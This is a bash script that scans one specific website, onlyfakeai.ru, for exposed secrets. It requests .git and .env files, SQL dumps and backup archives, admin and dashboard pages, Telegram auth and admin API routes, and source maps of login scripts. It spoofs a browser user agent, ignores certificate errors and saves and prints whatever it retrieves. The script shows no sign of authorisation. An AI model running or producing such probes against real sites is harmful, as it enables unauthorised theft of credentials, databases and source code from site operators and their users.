#!/bin/bash
set -u
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0 Safari/537.36'
B=https://onlyfakeai.ru
mkdir -p /tmp/ofa/exp

chk() {
  local p="$1"
  local code ct size
  code=$(curl -sS -k -m 15 -A "$UA" -o /tmp/ofa/exp/tmp.bin -w '%{http_code}' "$B$p")
  size=$(wc -c < /tmp/ofa/exp/tmp.bin)
  ct=$(file -b --mime-type /tmp/ofa/exp/tmp.bin 2>/dev/null)
  printf '%-40s %s %8s  %s\n' "$p" "$code" "$size" "$ct"
  if [ "$code" = "200" ] && [ "$size" -gt 20 ]; then
    echo "   >>> $(head -c 200 /tmp/ofa/exp/tmp.bin | tr -d '\n')"
  fi
}

for p in \
  /.git/config /.git/HEAD /.gitignore /.env /.env.local /.env.production \
  /package.json /package-lock.json /next.config.js /next.config.mjs \
  /backup.zip /backup.sql /db.sql /dump.sql /admin /admin/login /dashboard \
  /en/generator /generator /en/history /src /server /app \
  /_next/static/chunks/app \
  /api/auth/telegram-webapp/verify \
  /.well-known/security.txt \
  /johnwicktemplate.jpg \
  /api/telegram-admin-url/ \
  /assets/lang-config.js \
  ; do chk "$p"; done

echo
echo "=== source maps on login chunks ==="
for f in $(cat /tmp/ofa/loginjs/lf.txt); do
  n=$(basename "$f")
  code=$(curl -sS -k -m 10 -A "$UA" -o "/tmp/ofa/exp/$n.map" -w '%{http_code}' "$B$f.map")
  s=$(wc -c < "/tmp/ofa/exp/$n.map")
  echo "$code $s $f.map"
done
